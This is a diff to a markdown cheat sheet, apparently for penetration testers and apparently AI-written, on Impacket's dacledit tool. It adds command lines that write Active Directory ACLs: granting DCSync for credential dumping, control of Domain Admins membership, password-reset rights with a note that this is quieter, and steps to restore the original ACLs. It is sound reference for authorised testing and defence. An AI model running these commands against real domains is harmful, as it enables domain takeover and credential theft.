@@ -6,13 +6,43 @@ Impacket script (`impacket-dacledit`) for reading and writing Active Directory o
 
 **Source:** Ships with Impacket (https://github.com/fortra/impacket). **Install:** `pipx install impacket` (Kali: pre-installed as `impacket-dacledit`).
 
+**Actions (`-action`):** `read` (default) · `write` · `remove` · `backup` · `restore`.
+**Rights (`-rights`):** `FullControl` (default) · `ResetPassword` · `WriteMembers` · `DCSync` · `Custom` (with `-rights-guid <GUID>` for one specific extended right). Identify principal/target by name, or precisely with `-principal-sid`/`-target-sid`/`-principal-dn`/`-target-dn`.
+
 ```bash
-# Read who has rights over a target
+# Read the DACL on a target — who has what over it
+impacket-dacledit -action read -target <victim> '<domain>/<user>:<pass>'
+# Filter to a single principal's rights over the target
 impacket-dacledit -action read -principal <user> -target <victim> '<domain>/<user>:<pass>'
 
-# Grant FullControl (needs WriteDacl/GenericAll on the target)
-impacket-dacledit -action write -rights FullControl -principal <user> -target <victim> '<domain>/<user>:<pass>'
+# --- The escalation writes (each needs WriteDacl/GenericAll/WriteOwner→owner on the target) ---
+
+# Grant FullControl over a user/computer/group
+impacket-dacledit -action write -rights FullControl -principal <me> -target <victim> '<domain>/<user>:<pass>'
+
+# Grant DCSync on the DOMAIN object (target = domain) → then secretsdump -just-dc
+impacket-dacledit -action write -rights DCSync -principal <me> -target-dn 'DC=corp,DC=local' '<domain>/<user>:<pass>'
+
+# Just the ability to reset the target's password (quieter than FullControl)
+impacket-dacledit -action write -rights ResetPassword -principal <me> -target <victim> '<domain>/<user>:<pass>'
+
+# Grant add/remove-members on a group (WriteMembers) → add yourself later
+impacket-dacledit -action write -rights WriteMembers -principal <me> -target 'Domain Admins' '<domain>/<user>:<pass>'
+
+# One specific extended right by GUID (-rights Custom -rights-guid)
+impacket-dacledit -action write -rights Custom -rights-guid 00299570-246d-11d0-a768-00aa006e0529 \
+  -principal <me> -target <victim> '<domain>/<user>:<pass>'   # (that GUID = User-Force-Change-Password)
 ```
+
+> [!tip] **Cleanup — the half most writeups skip.** dacledit **auto-writes a `.bak` of the original DACL before every `write`/`remove`**, so you always have a restore point (note the filename it prints). You can also snapshot on demand:
+> ```bash
+> impacket-dacledit -action backup -target <victim> '<domain>/<user>:<pass>'   # → dacledit-<YYYYMMDD-HHMMSS>.bak
+> # ...do the attack, then put the original ACL back:
+> impacket-dacledit -action restore -target <victim> -file dacledit-<YYYYMMDD-HHMMSS>.bak '<domain>/<user>:<pass>'
+> # (or surgically drop just the ACE you added)
+> impacket-dacledit -action remove -rights FullControl -principal <me> -target <victim> '<domain>/<user>:<pass>'
+> ```
+> Auth also accepts `-hashes LM:NT`, `-k` (Kerberos ccache), `-aesKey`, and `-use-ldaps`.
 
 ---
 
@@ -21,5 +51,5 @@ impacket-dacledit -action write -rights FullControl -principal <user> -target <v
 ---
 
 *Created: 2026-09-25*
-*Updated: 2026-09-25*
+*Updated: 2026-09-28*
 *Model: claude-opus-4-8*
